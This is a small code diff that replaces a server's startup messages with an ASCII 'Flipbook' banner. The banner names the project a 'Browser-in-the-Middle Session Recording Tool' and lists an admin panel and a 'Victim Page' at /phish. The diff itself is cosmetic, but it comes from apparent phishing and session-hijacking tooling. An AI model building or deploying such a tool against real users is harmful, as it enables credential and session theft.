@@ -211,9 +211,22 @@ async function main(): Promise<void> {
   const host = process.env['HOST'] ?? '0.0.0.0';
 
   await fastify.listen({ port, host });
-  console.log(`\n[server] Flipbook running at http://${host}:${port}`);
-  console.log(`[server] Admin panel: http://localhost:${port}/admin`);
-  console.log(`[server] Victim page: http://localhost:${port}/phish\n`);
+  
+  // ASCII splash art
+  console.log('\n');
+  console.log('  ███████╗██╗     ██╗██████╗ ██████╗  ██████╗  ██████╗ ██╗  ██╗');
+  console.log('  ██╔════╝██║     ██║██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝');
+  console.log('  █████╗  ██║     ██║██████╔╝██████╔╝██║   ██║██║   ██║█████╔╝ ');
+  console.log('  ██╔══╝  ██║     ██║██╔═══╝ ██╔══██╗██║   ██║██║   ██║██╔═██╗ ');
+  console.log('  ██║     ███████╗██║██║     ██████╔╝╚██████╔╝╚██████╔╝██║  ██╗');
+  console.log('  ╚═╝     ╚══════╝╚═╝╚═╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝');
+  console.log('');
+  console.log('  Browser-in-the-Middle Session Recording Tool');
+  console.log('  ─────────────────────────────────────────────────────────────');
+  console.log(`  Server:      http://${host}:${port}`);
+  console.log(`  Admin Panel: http://localhost:${port}/admin`);
+  console.log(`  Victim Page: http://localhost:${port}/phish`);
+  console.log('');
 
   // ─── Graceful Shutdown Handler ──────────────────────────────────────────────
 
